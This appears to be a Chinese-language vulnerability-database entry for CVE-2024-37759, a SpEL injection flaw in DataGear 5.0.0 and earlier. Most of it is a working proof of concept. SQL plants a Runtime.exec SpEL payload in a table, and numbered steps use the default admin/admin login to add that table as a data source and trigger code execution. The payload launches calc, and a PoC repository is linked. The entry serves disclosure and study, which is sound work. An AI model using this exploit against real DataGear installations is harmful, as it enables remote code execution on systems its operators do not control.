# DataGear数据可视化分析平台存在SpEL表达式注入漏洞(CVE-2024-37759)

DataGear 5.0.0 及更早版本存在 SpEL 表达式注入漏洞，可导致远程代码执行。

## poc

### 准备恶意数据库表

```sql
CREATE DATABASE evil;

CREATE TABLE `evil` (
  `name` varchar(209) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `evil` VALUES ("#{T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')}");
```

### 第二步：添加恶意数据库源

1. 1. 登录 [http://localhost:50401](http://localhost:50401/)，默认账号密码为 admin/admin。
2. 1. 在架构添加界面中添加此 MySQL 数据库：`/schema/saveAdd`。
3. 1. 选择"数据源"—"数据源添加"，填写刚才创建的恶意数据库地址。

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409200954552.png)

### 第三步：触发漏洞执行代码

打开刚才添加的数据库，然后单击"查看"按钮，将执行 SpEL 表达式。

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409200954385.png)



## 漏洞脚本

https://github.com/crumbledwall/CVE-2024-37759_PoC/



## 漏洞来源

- https://forum.butian.net/article/590